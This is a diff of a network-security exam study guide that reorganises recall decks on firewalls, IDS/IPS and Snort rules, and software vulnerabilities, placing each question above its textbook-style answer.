@@ -7,6 +7,7 @@ type: note
 draft: true
 epub: true
 plum: false
+
 ---
 
 <script setup>
@@ -21,15 +22,10 @@ import DrawablePen from '../../src/components/DrawablePen.vue'
 
 <DrawablePen :cloudStorage="true" penEmoji="🖌️" strokeColor="rgba(236,72,153,0.35)" :strokeWidth="20" />
 
-**Exam date:** to be confirmed.
 **Scope:** slides 448 to 619 (Lectures 14 to 16), plus exercise lists 8 and 9.
 
-The link at the top of this page opens the Portuguese version. The content is the same.
-The exam is written in Portuguese, so every section keeps the Portuguese exam term
-next to the English one. Study the concept in English. Recognise the term in Portuguese.
-
-> **Scope assumption.** The course presentation slide lists only P1 and P2. The student
-> reports three exams this term. P1 covered slides 1 to 248. This page assumes that P2
+> **Scope assumption.** The course presentation slide lists only P1 and P2, but this term has
+> three exams. P1 covered slides 1 to 248. This page assumes that P2
 > covers slides 249 to 447 (modes of operation, hash, asymmetric, IPsec, TLS) and that P3
 > covers slides 448 to 619: Lecture 14 firewalls, Lecture 15 IDS/IPS, Lecture 16 software
 > vulnerabilities, with lists 8 and 9. The deck has 619 pages, so 619 is the last slide.
@@ -39,44 +35,7 @@ next to the English one. Study the concept in English. Recognise the term in Por
 
 [[toc]]
 
-## 0. Study plan
-
-Study from the decks in section 7. Open a Part only to check a missed card.
-
-### Method
-
-1. Before a deck, write what you remember of the topic. 2 minutes.
-2. Answer each question in full sentences, with the justification and the number,
-   before you scroll to the answers.
-3. Mark each card hit or miss. Note the miss codes, for example `F6 D9 V3`.
-4. Redo the misses until each one is a hit.
-5. Start each later session with all misses so far. A hit in a later session clears a miss.
-
-### Schedule
-
-Sessions of 45 minutes. One deck per session. Misses are quizzed again in the next session.
-
-| Session | Content                                                    |
-| ------- | ---------------------------------------------------------- |
-| 1       | Deck F (firewalls). Lists 8 section 4 tables on paper.     |
-| 2       | Deck D (IDS/IPS, honeypots, Snort), then misses.           |
-| 3       | Deck V (software vulnerabilities), then misses.            |
-| 4       | Section 6 numbers, section 8 essay skeletons, then misses. |
-| 5       | Mock exam, section 9. 45 minutes, no notes.                |
-| 6       | Correct the mock exam with the decks. Redo misses.         |
-| 7       | Day of the exam, 20 minutes: section 6 and the miss list.  |
-
-Paper is needed for F9, F10 and D17.
-
-**Practical rule:** the professor's questions always say _justifique_ ("justify your answer").
-Naming the mechanism earns nothing. Marks come from two things: **which problem the
-mechanism solves**, and **how it fails**.
-
----
-
 ## 0b. Portuguese to English glossary
-
-Learn these. The exam will use the left column.
 
 | Portuguese                       | English                          |
 | -------------------------------- | -------------------------------- |
@@ -1877,103 +1836,71 @@ on port 7680, is not detected, and a new protocol needs a new rule.
 
 ## 7. Recall decks
 
-Questions first, answers below. Each deck names its source Part.
-
 ### 7.1 Deck F: firewalls
 
-#### Questions
+Source: Part 1 and section 4.
 
 **F1.** State the firewall dilemma and the six stages of system evolution. Why is per host
 security not enough?
 
-**F2.** Define the perimeter, the choke point and defence in depth. State the three design
-goals of [BELL94] and how each is achieved.
-
-**F3.** What is the access policy, where does it come from, and what four characteristics
-can it filter on (NIST SP 800-41)?
-
-**F4.** Four capabilities and four limitations of a firewall.
-
-**F5.** Positive versus negative filter, and default discard versus default forward:
-mottoes, security, users, who uses each.
-
-**F6.** Five fields a packet filter uses. Three advantages and five weaknesses.
-
-**F7.** Table 9.1: the five SMTP rules, the flaw in rule 4, the exploit, the two refinements,
-and why the ACK flag works.
-
-**F8.** IP spoofing and tiny fragment: mechanism and countermeasure of each.
-
-**F9.** The lack of context problem: ports, numbers, and the stateful solution with its table.
-
-**F10.** Write the positive filter and the negative filter for the list 8 web server.
-Name the implicit rules.
-
-**F11.** Application-level gateway: mechanism, four properties, the GET and POST example.
-
-**F12.** Circuit-level gateway: mechanism, key difference, the hybrid use. SOCKS: version,
-RFC, port, position, components, the five TCP steps, UDP handling.
-
-**F13.** Bastion host: definition and nine characteristics, with the line count numbers.
-
-**F14.** Host-based, network device, virtual and personal firewalls: what each is and its
-advantages. Personal firewall implementations, default policy, FTP rule, four advanced
-features.
-
-**F15.** DMZ: what sits where, what lives in it, the three purposes of the internal firewall.
-
-**F16.** VPN: problem, solution, protocol, and the three IPsec positions with their problems.
-
-**F17.** Distributed firewalls: components, key characteristic, advantages.
-
-**F18.** DROP versus REJECT: what is sent back, the TCP flag, why DROP is stealth.
-
-#### Answers
-
-Source: Part 1 and section 4.
-
-**F1.** Protect the internal assets and still allow access to WANs and the Internet.
+Protect the internal assets and still allow access to WANs and the Internet.
 Stages: mainframe with terminals; LANs; premises network of several LANs; enterprise-wide
 network over a private WAN; Internet connectivity; enterprise cloud with virtualised servers.
 Per host security: thousands of systems with several OSs must each be patched when a flaw
 appears; needs scalable configuration management and aggressive patching; hard and sometimes
 not cost effective. The firewall is the accepted alternative or complement.
 
-**F2.** Perimeter: the wall between the premises network and the Internet. Choke point: one
+**F2.** Define the perimeter, the choke point and defence in depth. State the three design
+goals of [BELL94] and how each is achieved.
+
+Perimeter: the wall between the premises network and the Internet. Choke point: one
 point where security and auditing are imposed; one system or several cooperating. Defence in
 depth: the firewall is an extra layer isolating the internal systems, classical military
 doctrine. Goals: all traffic passes the firewall, by physically blocking every other path;
 only policy authorised traffic passes; the firewall is immune to penetration, through a
 hardened system with a secure OS.
 
-**F3.** The list of traffic types authorised to pass, by address ranges, protocols,
+**F3.** What is the access policy, where does it come from, and what four characteristics
+can it filter on (NIST SP 800-41)?
+
+The list of traffic types authorised to pass, by address ranges, protocols,
 applications, content types. Developed from the risk assessment and the information security
 policy: broad specification, refined to filter elements, implemented in the topology.
 Characteristics: IP address and protocol (packet filters, stateful); application protocol
 (proxy: SMTP spam, HTTP sites); user identity (inside users, needs IPsec); network activity
 (time of day, request rate against scanning, patterns).
 
-**F4.** Capabilities: single choke point (keeps unauthorised users out, blocks vulnerable
+**F4.** Four capabilities and four limitations of a firewall.
+
+Capabilities: single choke point (keeps unauthorised users out, blocks vulnerable
 services, protects against spoofing and routing attacks, simplifies management); monitoring
 location (audits, alarms); platform for NAT and network management logs; platform for IPsec
 VPNs in tunnel mode. Limitations: attacks that bypass it (own ISP link, partner links);
 internal threats (disgruntled employee, phishing victim); insecure wireless LANs; infected
 portable devices (BYOD).
 
-**F5.** Positive filter passes only matching packets, deny at the end. Negative filter rejects
+**F5.** Positive versus negative filter, and default discard versus default forward:
+mottoes, security, users, who uses each.
+
+Positive filter passes only matching packets, deny at the end. Negative filter rejects
 matching packets, allow at the end. Default discard: "not expressly permitted is prohibited",
 more secure, everything blocked then added case by case, visible to users as an obstacle,
 business and government. Default forward: "not expressly prohibited is permitted", easier for
 users, reduced security, admin reacts to each new threat, open organisations such as
 universities.
 
-**F6.** Source IP, destination IP, source and destination port, IP protocol field (TCP, UDP,
+**F6.** Five fields a packet filter uses. Three advantages and five weaknesses.
+
+Source IP, destination IP, source and destination port, IP protocol field (TCP, UDP,
 ICMP), interface. Advantages: simplicity, transparency, speed (no payload). Weaknesses: no
 upper layer data (cannot block application commands); limited logging; no advanced user
 authentication; vulnerable to TCP/IP stack attacks such as spoofing; prone to
 misconfiguration because of few variables.
 
-**F7.** Rule 1 in, external to internal, TCP, dest 25, permit. Rule 2 out, dest > 1023,
+**F7.** Table 9.1: the five SMTP rules, the flaw in rule 4, the exploit, the two refinements,
+and why the ACK flag works.
+
+Rule 1 in, external to internal, TCP, dest 25, permit. Rule 2 out, dest > 1023,
 permit. Rule 3 out, dest 25, permit. Rule 4 in, dest > 1023, permit. Rule 5 either, any, deny.
 Flaw: rule 4 lets external traffic reach any port above 1023. Exploit: attacker port 5150 to
 internal proxy port 8080. Refinement 1: source port 25 on rules 2 and 4, source port > 1023
@@ -1981,14 +1908,18 @@ on rules 1 and 3. Remaining hole: an attacker runs a service on port 25 and send
 port 25. Refinement 2: rule 4 requires the ACK flag, because a packet of an established
 connection always has ACK, and a packet starting a connection has SYN without ACK.
 
-**F8.** Spoofing: packets from outside carry an internal trusted source address to pass
+**F8.** IP spoofing and tiny fragment: mechanism and countermeasure of each.
+
+Spoofing: packets from outside carry an internal trusted source address to pass
 address based security; countermeasure: discard packets arriving on the external interface
 with an internal source address. Tiny fragment: IP fragmentation pushes the TCP header with
 the ports into a later fragment, the filter decides on the first fragment and lets the rest
 through; countermeasure: require a minimum amount of transport header in the first fragment,
 and if it is rejected remember the packet ID and discard the following fragments.
 
-**F9.** The stateless filter decides packet by packet with no knowledge of connections.
+**F9.** The lack of context problem: ports, numbers, and the stateful solution with its table.
+
+The stateless filter decides packet by packet with no knowledge of connections.
 Server: fixed well-known port below 1024 (SMTP 25). Client: temporary port above 1024
 (49152). To let replies in, every high port must be open inbound. Stateful: a state table of
 active outbound TCP connections (source address and port, destination address and port,
@@ -1996,19 +1927,27 @@ state, for example 192.168.1.100:1030 to 210.9.88.29:80 established); inbound tr
 high port is accepted only if it matches an entry. Also tracks TCP sequence numbers against
 session hijacking and does limited DPI for FTP, IM, SIPS.
 
-**F10.** Positive: any:>1023 to 172.16.20.5:80 permit; any:>1023 to 172.16.20.5:443 permit;
+**F10.** Write the positive filter and the negative filter for the list 8 web server.
+Name the implicit rules.
+
+Positive: any:>1023 to 172.16.20.5:80 permit; any:>1023 to 172.16.20.5:443 permit;
 10.0.0.100:>1023 to 172.16.20.5:22 permit; implicit deny all. Negative: 10.0.0.100 to :22
 permit (exception first); any to :22 deny; any to :21 deny; any to :1-79, :81-442,
 :444-65535 deny; implicit allow all. The negative filter needs ranges to express "others: no".
 
-**F11.** A relay at application level: the user contacts the gateway, gives the remote host
+**F11.** Application-level gateway: mechanism, four properties, the GET and POST example.
+
+A relay at application level: the user contacts the gateway, gives the remote host
 and credentials, the gateway opens its own connection to the server and relays segments; two
 spliced connections, no end-to-end. Granular control: no proxy code, no service; permit HTTP
 GET, deny POST. More secure: a few applications instead of countless IP, port, flag
 combinations. Easy logging and auditing at application level. Disadvantage: processing
 overhead on both connections.
 
-**F12.** Two TCP connections, internal host to gateway and gateway to external host; once
+**F12.** Circuit-level gateway: mechanism, key difference, the hybrid use. SOCKS: version,
+RFC, port, position, components, the five TCP steps, UDP handling.
+
+Two TCP connections, internal host to gateway and gateway to external host; once
 established it relays segments without examining the payload; security is only which
 connections are permitted. Hybrid: trusted inside users, application proxy inbound
 (expensive, secure), circuit-level outbound (cheap). SOCKS v5, RFC 1928, server on TCP
@@ -2018,7 +1957,9 @@ clients relinked. TCP: connect to 1080, negotiate authentication, authenticate, 
 request (IP and port), the server evaluates and connects. UDP: a TCP control connection to
 1080 only to authenticate, then UDP segments are relayed while it stays open.
 
-**F13.** A system identified by the administrator as a critical strong point; the platform
+**F13.** Bastion host: definition and nine characteristics, with the line count numbers.
+
+A system identified by the administrator as a critical strong point; the platform
 for application and circuit gateways and services such as IPsec; a hardened system with a
 secure OS. Characteristics: only essential services (proxies for DNS, FTP, HTTP, SMTP);
 extra authentication before the proxies and per proxy; each proxy supports a command subset;
@@ -2028,7 +1969,11 @@ one can be removed, new services added; no disk access beyond the initial config
 executable file systems can be read only against Trojans and sniffers; each proxy runs as a
 non-privileged user in a private directory.
 
-**F14.** Host-based: a software module protecting one host, often a server; tailored rules,
+**F14.** Host-based, network device, virtual and personal firewalls: what each is and its
+advantages. Personal firewall implementations, default policy, FTP rule, four advanced
+features.
+
+Host-based: a software module protecting one host, often a server; tailored rules,
 topology independent protection, extra layer so new servers need no network firewall change.
 Network device: packet filtering and stateful inspection in routers and switches, extra
 layers. Virtual: a virtualised bastion host as a VM, or firewall functions in the hypervisor.
@@ -2039,14 +1984,18 @@ the user permits, outbound permitted. FTP: ports 20 and 21 open, and after a con
 20 or 21, ports 1024 to 65535 open for data. Advanced: stealth mode (drop unsolicited
 packets), UDP blocking, logging, application filter (only selected or CA signed applications).
 
-**F15.** External firewall at the edge after the boundary router; internal firewall(s)
+**F15.** DMZ: what sits where, what lives in it, the three purposes of the internal firewall.
+
+External firewall at the edge after the boundary router; internal firewall(s)
 protecting the enterprise network; the DMZ between them with the web site, SMTP server and
 DNS server. External firewall: moderate protection for the DMZ, basic for the rest. Internal
 firewall: stricter filtering; two-way protection, the internal network from a compromised DMZ
 server (malware, rootkits, bots) and the DMZ from the internal network; internal segmentation
 with several firewalls (servers versus workstations).
 
-**F16.** Problem: dispersed LANs must interconnect; the Internet is cheaper and easier than
+**F16.** VPN: problem, solution, protocol, and the three IPsec positions with their problems.
+
+Problem: dispersed LANs must interconnect; the Internet is cheaper and easier than
 private lines but exposes traffic to eavesdropping and unauthorised access. Solution: a VPN,
 computers interconnected over an insecure network with encryption and authentication at lower
 layers, same system at both ends. Protocol: IPsec; the IPsec device encrypts and compresses
@@ -2055,12 +2004,16 @@ workstation can run IPsec but becomes an attractive target. Positions: behind th
 the firewall cannot filter, scan, log or control encrypted traffic; in the boundary router,
 less secure than the firewall; in the firewall itself, the functional choice.
 
-**F17.** Stand-alone network firewalls plus host-based firewalls on servers and workstations,
+**F17.** Distributed firewalls: components, key characteristic, advantages.
+
+Stand-alone network firewalls plus host-based firewalls on servers and workstations,
 under central administrative control; tools let the administrator set policies and monitor
 hundreds of host and personal firewalls, local and remote. Advantages: protection against
 internal attacks, protection tailored to machines and applications.
 
-**F18.** DROP discards silently, nothing goes back; REJECT discards and sends an error, an
+**F18.** DROP versus REJECT: what is sent back, the TCP flag, why DROP is stealth.
+
+DROP discards silently, nothing goes back; REJECT discards and sends an error, an
 ICMP error or a TCP reset (beyond the slides). The flag is RST. Stealth: with REJECT the
 attacker gets an immediate "closed, host alive" per probe; with DROP each probe waits for a
 timeout and retransmits, the port reads "filtered", and the host appears absent, which is
@@ -2068,65 +2021,12 @@ the stealth mode of slide 500.
 
 ### 7.2 Deck D: IDS/IPS, honeypots and Snort
 
-#### Questions
+Source: Part 2 and section 5.
 
 **D1.** Outsiders versus insiders, and the four classes of intruder with motivation and
 examples.
 
-**D2.** Where do IDS/IPS work well and where do they fail? Why?
-
-**D3.** The common attack methodology and its six steps, with one example each.
-
-**D4.** Define security intrusion, intrusion detection, and the three logical components of
-an IDS. Classify by data source.
-
-**D5.** Three motivations for an IDS. The fundamental assumption and its consequence.
-
-**D6.** The loose versus tight trade-off. The classical view on outsiders and insiders.
-The base-rate fallacy.
-
-**D7.** The nine requirements of an IDS.
-
-**D8.** Anomaly detection: the two phases and the three categories, with advantages and
-disadvantages of each. Six machine learning approaches.
-
-**D9.** Signature versus heuristic detection: how, where used, advantages, disadvantages,
-the rule source, the example system.
-
-**D10.** Signature versus anomaly on zero-day, false positives, cost, adaptability.
-
-**D11.** HIDS: definition, purposes, four data sources with advantage and disadvantage.
-
-**D12.** Anomaly HIDS on Linux: why system calls, STIDE, the four ML engines. Signature
-HIDS: what it is the basis of, two techniques, limit.
-
-**D13.** NIDS: definition, layers, contrast with HIDS, architecture, the encryption
-limitation.
-
-**D14.** Inline versus passive sensor. The passive configuration with the tap and two NICs.
-Wireless sensors and WIDS.
-
-**D15.** Honeypots: definition, three objectives, the logic, the value rule, low versus high
-interaction with trade-offs, honeynet.
-
-**D16.** The three honeypot positions with advantages and disadvantages. Honeyfiles.
-
-**D17.** Write the Snort rule header and explain each part. Explain msg, flow, content,
-depth, threshold, reference, classtype, sid, rev.
-
-**D18.** The Snort pipeline from packet to alert. Which approach is the BitTorrent rule?
-
-**D19.** IDS versus IPS in terms of action. Why is a packet filter insufficient for
-detection?
-
-**D20.** HIDS or NIDS for: anomalous system calls, port scan, web server exploit, sensitive
-file access. Where does combining them help most?
-
-#### Answers
-
-Source: Part 2 and section 5.
-
-**D1.** Most violations by outsiders, some by insiders, insiders can be much more dangerous;
+Most violations by outsiders, some by insiders, insiders can be much more dangerous;
 targeted attacks bypass perimeter defences, hence defence in depth. Cyber criminals:
 financial reward, identity and credential theft, espionage, data theft or ransom, underground
 forums (DarkMarket). Activists: social or political causes, often low skill, defacement, DoS,
@@ -2134,12 +2034,16 @@ leaks; Anonymous, LulzSec, Manning, Snowden. APTs: state sponsored espionage or 
 secret and persistent; China, Russia, USA, UK. Others: classic hackers for challenge and
 reputation (found buffer overflow), hobby hackers with toolkits, recruitable.
 
-**D2.** Reasonably effective against known, less sophisticated attacks: activist groups,
+**D2.** Where do IDS/IPS work well and where do they fail? Why?
+
+Reasonably effective against known, less sophisticated attacks: activist groups,
 large scale e-mail scams. Less effective against sophisticated targeted attacks by cyber
 criminals and APTs, because they use zero-day exploits and hide their activity. Hence part of
 defence in depth with cryptography, audit trails, strong authentication, active management.
 
-**D3.** Phishing, malware installation, credential theft, compromise. Target acquisition and
+**D3.** The common attack methodology and its six steps, with one example each.
+
+Phishing, malware installation, credential theft, compromise. Target acquisition and
 information gathering: OSINT, DNS and WHOIS, NMAP, probe e-mail, vulnerable CMS. Initial
 access: brute force the CMS password, plugin exploit, spear-phishing with a browser exploit.
 Privilege escalation: local exploits to root, sniffers for admin passwords. Information
@@ -2147,7 +2051,10 @@ gathering or exploitation: scan files for financial data and PII, exfiltrate doc
 lateral movement with captured passwords. Maintaining access: RAT or rootkit backdoor, keep
 the admin password, disable antivirus or IDS. Covering tracks: rootkit hides files, edit logs.
 
-**D4.** Intrusion: an unauthorised act of bypassing the security mechanisms of a system.
+**D4.** Define security intrusion, intrusion detection, and the three logical components of
+an IDS. Classify by data source.
+
+Intrusion: an unauthorised act of bypassing the security mechanisms of a system.
 Intrusion detection: a hardware or software function that collects and analyses information
 from several areas of a computer or network to identify possible intrusions. Components:
 sensors (collect packets, logs, system calls and forward), analysers (decide, with evidence
@@ -2156,13 +2063,18 @@ and guidance; data may be stored), user interface (view and control). Architectu
 (one host: PIDs, system calls), NIDS (traffic of segments), distributed or hybrid (combines
 both, better identification and response).
 
-**D5.** Fast detection (eject the intruder before damage; earlier means less damage, faster
+**D5.** Three motivations for an IDS. The fundamental assumption and its consequence.
+
+Fast detection (eject the intruder before damage; earlier means less damage, faster
 recovery), deterrent effect, information gathering to strengthen prevention (firewall rules,
 patches). Assumption: intruder behaviour differs from legitimate behaviour in quantifiable
 ways. No crisp distinction exists, so overlap and therefore false positives and negatives;
 the analyser minimises the overlap.
 
-**D6.** Loose interpretation catches more intruders and produces many false positives
+**D6.** The loose versus tight trade-off. The classical view on outsiders and insiders.
+The base-rate fallacy.
+
+Loose interpretation catches more intruders and produces many false positives
 (authorised users flagged). Tight limits false positives and raises false negatives (missed
 intruders). Goal: maximise detection rate, minimise false alarm rate; a compromise and an
 art. Classical view: outsiders are distinguishable with reasonable confidence from historical
@@ -2172,12 +2084,17 @@ intelligently defined rules of unauthorised use. Base-rate fallacy: intrusions a
 compared with legitimate use, so unless the IDS is almost perfect the false alarm rate is high;
 frequent false alarms get ignored or waste time, a low detection rate gives false security.
 
-**D7.** Run continuously with minimal supervision; fault tolerant, recovers from crashes;
+**D7.** The nine requirements of an IDS.
+
+Run continuously with minimal supervision; fault tolerant, recovers from crashes;
 resists subversion, monitors itself; minimal overhead; configurable to the security policy;
 adapts to changes in system and user behaviour; scales to many hosts; avoids complete stop of
 service when components fail; dynamic reconfiguration without restart.
 
-**D8.** Training phase builds the model of legitimate behaviour from sensor data in normal
+**D8.** Anomaly detection: the two phases and the three categories, with advantages and
+disadvantages of each. Six machine learning approaches.
+
+Training phase builds the model of legitimate behaviour from sensor data in normal
 operation (at distinct moments or continuously); detection phase compares observed behaviour
 with the model and classifies it. Statistical: univariate (crude), multivariate
 (correlations), time series (order and timing); simple, cheap, no assumptions; hard to pick
@@ -2189,7 +2106,10 @@ trained; depends on assumptions about accepted behaviour, false alarm rate curre
 unacceptable, training costs much time and resources. Approaches: Bayesian networks, Markov
 models, neural networks, fuzzy logic, genetic algorithms, clustering and outlier detection.
 
-**D9.** Misuse detection: a set of known malicious patterns or attack rules; a match means an
+**D9.** Signature versus heuristic detection: how, where used, advantages, disadvantages,
+the rule source, the example system.
+
+Misuse detection: a set of known malicious patterns or attack rules; a match means an
 intruder. Signatures compare data with known malicious patterns, detailed enough to limit
 false alarms yet catch enough; used in antivirus, traffic scanning proxies, NIDS; low cost,
 wide acceptance; significant effort to build signatures, no zero-day. Heuristics use rules
@@ -2197,13 +2117,17 @@ for known attacks or known weaknesses and suspicious behaviour even inside norma
 best source is analysing attack tools and scripts from the Internet plus expert rules;
 specific to machine and OS. Snort is the rule based NIDS with a large rule collection.
 
-**D10.** Zero-day: signature no, anomaly possible. False positives: signature low, anomaly
+**D10.** Signature versus anomaly on zero-day, false positives, cost, adaptability.
+
+Zero-day: signature no, anomaly possible. False positives: signature low, anomaly
 higher (overlap, base rate, ML unacceptable today). Cost: signature low at run time, effort
 to write and review; anomaly depends, statistical cheap, knowledge-based needs experts, ML
 expensive to train then efficient. Adaptability: signature needs a new signature per attack;
 anomaly evolves with behaviour, ML flexible; requirement 6 of an IDS.
 
-**D11.** A specialised security software layer on vulnerable or sensitive systems (database
+**D11.** HIDS: definition, purposes, four data sources with advantage and disadvantage.
+
+A specialised security software layer on vulnerable or sensitive systems (database
 servers, administrative systems), monitoring activity inside; detect intrusions, log
 suspicious events, send alerts; both approaches. System call traces: preferred, works on
 Unix and Linux, problematic on Windows because DLLs obscure which process calls what. Audit
@@ -2213,7 +2137,10 @@ a baseline; the good checksums must be generated and protected, files that chang
 legitimately are hard. Registry access: Windows, lots of program activity there; very
 specific, limited success. Sensor: collect, filter to a standard format, forward.
 
-**D12.** Most anomaly HIDS work was on UNIX and Linux, easy data collection; system calls are
+**D12.** Anomaly HIDS on Linux: why system calls, STIDE, the four ML engines. Signature
+HIDS: what it is the basis of, two techniques, limit.
+
+Most anomaly HIDS work was on UNIX and Linux, easy data collection; system calls are
 how programs reach the kernel and give detailed process activity. STIDE compares observed
 call sequences with normal training sequences for a mismatch ratio. Alternatives: HMM, ANN,
 SVM, ELM. Performance: detection rate, false positives, detection speed. Signature HIDS is the
@@ -2221,14 +2148,20 @@ basis of antivirus, on PCs, mobiles, e-mail and web proxies, NIDS; signatures (f
 of known malware) and heuristics (rules of known malicious behaviour); very efficient on known
 malware, cannot detect zero-day; widely used on Windows.
 
-**D13.** Monitors traffic at selected points, packet by packet, real time or near it, at L3,
+**D13.** NIDS: definition, layers, contrast with HIDS, architecture, the encryption
+limitation.
+
+Monitors traffic at selected points, packet by packet, real time or near it, at L3,
 L4 and L7. NIDS examines packet traffic directed at systems, HIDS examines user and software
 activity inside a host. Part of the perimeter infrastructure, in or beside the firewall,
 focused on external attempts. Sensors, management servers, management consoles. With TLS/SSL
 the NIDS lost access to meaningful payload (cannot see commands in HTTPS); important but only
 part of the solution.
 
-**D14.** Inline: in the segment, traffic passes through it, may be combined with a firewall
+**D14.** Inline versus passive sensor. The passive configuration with the tap and two NICs.
+Wireless sensors and WIDS.
+
+Inline: in the segment, traffic passes through it, may be combined with a firewall
 or switch, can block, acts as IDS and IPS. Passive: most common, monitors a copy, real traffic
 does not pass, more efficient, no delay. Configuration: a tap on the medium (fibre) gives a
 copy of all traffic; NIC 1 on the tap, usually no IP, promiscuous mode; NIC 2 with an IP for
@@ -2236,7 +2169,10 @@ the management server. Wireless sensors inline in an AP or passive on the air; o
 wireless protocol attacks (wireless DoS, session hijacking, rogue AP); WIDS is a NIDS only for
 wireless.
 
-**D15.** Decoy systems that lure attackers away from critical systems. Divert, collect
+**D15.** Honeypots: definition, three objectives, the logic, the value rule, low versus high
+interaction with trade-offs, honeynet.
+
+Decoy systems that lure attackers away from critical systems. Divert, collect
 information on techniques and tools, gain time for administrators to respond. Filled with
 fabricated valuable looking information no legitimate user accesses, so any access is
 suspicious; instrumented with monitors and loggers; the attack seems to succeed so the
@@ -2248,7 +2184,9 @@ the attacker longer; needs far more resources, and if compromised it attacks oth
 and reputation problems. Honeynet Project: whole networks of honeypots emulating a company
 with simulated traffic.
 
-**D16.** External, before the firewall: tracks scans of unused IPs, no risk to the internal
+**D16.** The three honeypot positions with advantages and disadvantages. Honeyfiles.
+
+External, before the firewall: tracks scans of unused IPs, no risk to the internal
 network, reduces noise on firewall and internal sensors; little capture of insiders. DMZ:
 monitors attacks on public services; contamination risk for other DMZ systems; the external
 firewall blocks most traffic (only 80 and 443), so either open it and raise risk or limit the
@@ -2257,7 +2195,10 @@ firewall; high risk, a compromised honeypot attacks internal systems, the firewa
 attacker's traffic as permitted, exception rules needed. Honeyfiles: fake documents with
 realistic names ("Salarios Diretoria.xlsx") as bait; any access is suspicious.
 
-**D17.** `alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]`: alert generates an alert;
+**D17.** Write the Snort rule header and explain each part. Explain msg, flow, content,
+depth, threshold, reference, classtype, sid, rev.
+
+`alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]`: alert generates an alert;
 tcp only TCP; $HOME_NET any, source internal network, any port; -> direction; $EXTERNAL_NET
 ![7680,1521], destination external network, except ports 7680 and 1521. msg: the log
 message "ET P2P BitTorrent peer sync". flow:established,to_server: only established TCP
@@ -2267,18 +2208,26 @@ count 1: one alert per destination every 300 s. reference: URL of the BitTorrent
 documentation. classtype:policy-violation: category. sid:2000334: unique ID. rev:14: revision 14. metadata: created 2010_07_30, confidence Medium, severity Informational, updated
 2025_06_30.
 
-**D18.** Network traffic, packet decoder, preprocessor, detection engine with the rules,
+**D18.** The Snort pipeline from packet to alert. Which approach is the BitTorrent rule?
+
+Network traffic, packet decoder, preprocessor, detection engine with the rules,
 logging and alerting system, output modules, output as alert or log. The rule is signature
 detection: a fixed byte pattern at a fixed position in a known protocol state, no baseline,
 no training; Snort is the rule based NIDS example.
 
-**D19.** IDS detects, logs and alerts, can use a passive sensor on a copy of the traffic. IPS
+**D19.** IDS versus IPS in terms of action. Why is a packet filter insufficient for
+detection?
+
+IDS detects, logs and alerts, can use a passive sensor on a copy of the traffic. IPS
 blocks the attack, needs an inline sensor, risks blocking legitimate traffic on a false
 positive and adds delay. Packet filter: headers only, no payload, no application attacks,
 limited log, no context between packets, bypassed by spoofing and fragments, never sees
 traffic that bypasses it or insiders; detection needs payload, packet sequences and host data.
 
-**D20.** System calls: HIDS, the preferred source, STIDE. Port scan: NIDS, a pattern across
+**D20.** HIDS or NIDS for: anomalous system calls, port scan, web server exploit, sensitive
+file access. Where does combining them help most?
+
+System calls: HIDS, the preferred source, STIDE. Port scan: NIDS, a pattern across
 the segment. Web exploit: NIDS with signatures, but HIDS on the server when HTTPS blinds the
 NIDS. Sensitive files: HIDS, checksums, audit records, honeyfiles. Combination (distributed
 or hybrid IDS) helps most on the web server: the NIDS sees the request, the HIDS sees the
@@ -2286,53 +2235,12 @@ effect and covers HTTPS; and on exfiltration after file access, visible only on 
 
 ### 7.3 Deck V: software vulnerabilities
 
-#### Questions
+Source: Part 3.
 
 **V1.** The root of the problem. The five OWASP Top 10 code flaws. The three CWE/SANS
 Top 25 categories with two examples each.
 
-**V2.** How does software security differ from software quality? Who chooses the probability
-distribution?
-
-**V3.** Define defensive programming and its key rule. What does the software do under
-attack?
-
-**V4.** Why do programmers not write defensively? Business pressure, maintenance, mindset,
-maturity, standards.
-
-**V5.** The four critical areas of interaction. Define input and its sources. Two concerns.
-
-**V6.** Buffer overflow: the assumption, the consequence, why tests miss it, the fixes.
-
-**V7.** The lecture C example: what overflows into what, why, what GCC prints, which flag
-reproduces the attack.
-
-**V8.** Interpretation of input: binary versus text, Heartbleed, character sets.
-
-**V9.** Injection attacks: definition, mechanism, where common. SQL injection example,
-input and prevention.
-
-**V10.** Code injection in PHP: the include scenario, the GET example, the two PHP features,
-the defences. Insecure deserialisation.
-
-**V11.** XSS: the cookie example, obfuscation, prevention, the nature of the flaw, the real
-target.
-
-**V12.** Whitelist versus blacklist. Canonicalisation with the "/" example. The casting
-vulnerability. Fuzzing.
-
-**V13.** Algorithm flaws: four historical examples. Memory and concurrency risks and defences.
-
-**V14.** OS interaction: environment variables and their attacks, least privilege practices,
-modularisation, chroot, file shredding.
-
-**V15.** Output: the common origin problem, two attacks through output, three mitigations.
-
-#### Answers
-
-Source: Part 3.
-
-**V1.** Bad programming practices cause many vulnerabilities; awareness is the first step.
+Bad programming practices cause many vulnerabilities; awareness is the first step.
 OWASP: unvalidated input, XSS, buffer overflow, injection flaws, improper error handling.
 CWE/SANS: insecure interaction between components (SQL injection, OS command injection, XSS,
 CSRF, dangerous upload, open redirect); risky resource management (buffer overflow, path
@@ -2341,16 +2249,25 @@ format string, integer overflow); porous defences (missing authentication or aut
 hard-coded credentials, missing encryption, untrusted input in a security decision,
 unnecessary privileges, broken cryptography, unlimited login attempts, hash without salt).
 
-**V2.** Quality: failures follow some probability distribution; structured design and tests
+**V2.** How does software security differ from software quality? Who chooses the probability
+distribution?
+
+Quality: failures follow some probability distribution; structured design and tests
 on likely inputs remove most bugs; what matters is how often bugs trigger. Security: the
 attacker chooses the distribution, aiming at exploitable bugs triggered by inputs far from the
 expected, so common tests miss them. Secure code assumes nothing and checks every error.
 
-**V3.** Designing and implementing software so that it keeps working under attack; it detects
+**V3.** Define defensive programming and its key rule. What does the software do under
+attack?
+
+Designing and implementing software so that it keeps working under attack; it detects
 erroneous conditions caused by an attack and continues safely or fails gracefully. Rule: never
 assume anything, verify every assumption, handle every possible error state.
 
-**V4.** Programmers focus on the steps to success and the normal flow, not on failure points;
+**V4.** Why do programmers not write defensively? Business pressure, maintenance, mindset,
+maturity, standards.
+
+Programmers focus on the steps to success and the normal flow, not on failure points;
 error handling adds code and time, conflicting with short schedules and market advantage;
 unless security is a design goal from the start, a secure program is unlikely. Maintenance:
 verify assumptions, errors and interactions with existing code, or a secure program becomes
@@ -2360,26 +2277,35 @@ software failure far more than collapsing bridges; standards ISO 12207 and SEI06
 security as a design goal; SAFECode publishes best practices; threat modelling belongs in
 design.
 
-**V5.** Input handling, algorithm implementation, interaction with other components, output.
